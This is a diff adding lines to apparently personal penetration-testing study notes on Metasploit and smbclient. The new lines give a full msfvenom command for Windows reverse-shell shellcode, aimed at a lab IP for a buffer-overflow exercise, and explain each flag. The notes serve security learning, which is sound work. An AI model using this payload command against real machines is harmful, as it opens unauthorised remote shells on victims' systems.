@@ -56,6 +56,13 @@ tags:
 	- You can set pretty much everything in general such as the LHOST, ports, and the payload `set payload linux/x86/shell_bind_tcp`
 - Once your options are set you can then `run` or `exploit` to use the tool
 - Typing `options` after a failed exploitation attempt may provide you with payload options
+- This commands `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.57.6 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"` is used during [[Buffer Overflow index|Buffer Overflow]] at the [[Buffer Overflow Steps#^0dee88|shellcode generation]] step using the msfvenom tool from metasploit to gain reverse shell access to the target windows machine
+	- This is a reverse shell attack, so we need to send our own machine's IP and port to the target.
+	- Adding an `EXITFUNC` makes the attack more stable
+	- `-f`means file type which is set to `c`as the output file
+	- `-a`is our architecture
+	- `-b`is for bad characters that should be used which we found here [[Buffer Overflow Steps#^d6154c|Buffer Overflow stes#Finding Bad Characters]]
+
 #### smbclient
 - Not exactly a hacking tool, but it can connect to an smbserver's file share
 - If you can anonymously connect to an smbserver you can get an idea of the network's file structure, and may find important files
